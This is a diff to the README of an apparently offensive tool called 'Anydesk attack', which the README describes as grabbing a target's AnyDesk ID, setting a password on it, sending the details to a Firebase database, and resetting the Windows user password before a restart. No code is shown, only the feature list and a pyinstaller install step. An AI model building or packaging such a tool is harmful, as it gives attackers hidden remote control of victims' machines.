@@ -3,10 +3,10 @@
 Anydesk attack is an automation tool used to grab the anydesk id of the target and sets a password to it
 
 # Features
-- The info will be sent to the database
+- The info will be sent to the firebase database
 - This will also set the password for the current windows user and perform a restart
 
-### Installation
+## Installation
 ```
 pip install pyinstaller
 ```
